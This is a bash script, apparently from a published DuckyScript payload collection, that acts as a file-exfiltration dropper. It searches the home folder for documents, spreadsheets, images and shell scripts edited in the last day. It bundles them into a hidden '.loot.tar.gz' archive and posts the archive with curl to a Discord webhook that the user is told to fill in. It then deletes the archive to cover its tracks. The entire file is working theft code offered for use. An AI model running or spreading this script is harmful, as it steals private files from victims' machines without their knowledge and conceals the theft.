#!/bin/bash

# --> See README.md for full information (https://github.com/OSINTI4L/DuckyScript-Payloads/blob/main/Payloads/Ducky_Dropper/README.md) <--
# This is a DEMONSTRATION payload that is part of the Ducky_Dropper payload system that identifies files modified in the last 24 hours, tarballs them, exfiltrates them to a Discord webhook, and then deletes the tarball to obfuscate.
# You must insert your Discord webhook in line 37.

# Creating file_check function to see if the listed filetypes (and their respective documents) have been modified (edited) in the past 24 hours:
file_check() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | grep -q . 
}

# Creating hidden tarball function to tarball the listed documents (of the respective filetypes) that have been modified (edited) in the past 24 hours:
tarball() {
    find ~ -mtime -1 -type f \( -name "*.txt" -o -name "*.pdf" -o -name "*.docx" -o -name "*.doc" -o -name "*.csv" -o -name "*.xlsx" -o -name "*.png" -o -name "*.jpg" -o -name "*.jpeg" -o -name "*.sh" \) -print0 | tar -caf ~/.loot.tar.gz --null -T -
}

# Creating net_check function to check for internet connectivity by send a PING to hak5.org:
net_check() {
    ping -c 1 hak5.org
}

# If internet connection, check for files, if files, tarball, else exit:
if net_check; then
    if file_check; then
        tarball
    else
        exit 0
    fi
else
    exit 0
fi

# Exfiltrate tarball of found files to Discord:
curl -X POST -H "Content-Type: multipart/form-data" \
-F "file=@/home/$USER/.loot.tar.gz" \
-F "content=$ Loot Incoming $" \
# --> PLACE DISCORD WEBHOOK HERE <--

# Remove the tarball post exfiltration to obfuscate:
rm ~/.loot.tar.gz
